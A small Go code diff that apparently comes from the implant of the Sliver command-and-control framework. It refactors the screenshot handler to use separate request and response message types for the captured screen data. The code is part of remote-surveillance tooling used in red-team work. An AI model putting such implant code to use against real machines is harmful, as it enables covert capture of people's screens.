@@ -174,7 +174,7 @@ func ifconfig() *sliverpb.Ifconfig {
 }
 
 func screenshotHandler(data []byte, resp RPCResponse) {
-	sc := &sliverpb.Screenshot{}
+	sc := &sliverpb.ScreenshotReq{}
 	err := proto.Unmarshal(data, sc)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -185,9 +185,9 @@ func screenshotHandler(data []byte, resp RPCResponse) {
 	// {{if .Config.Debug}}
 	log.Printf("Screenshot Request")
 	// {{end}}
-
-	sc.Data = screen.Screenshot()
-	data, err = proto.Marshal(sc)
+	scRes := &sliverpb.Screenshot{}
+	scRes.Data = screen.Screenshot()
+	data, err = proto.Marshal(scRes)
 
 	resp(data, err)
 }
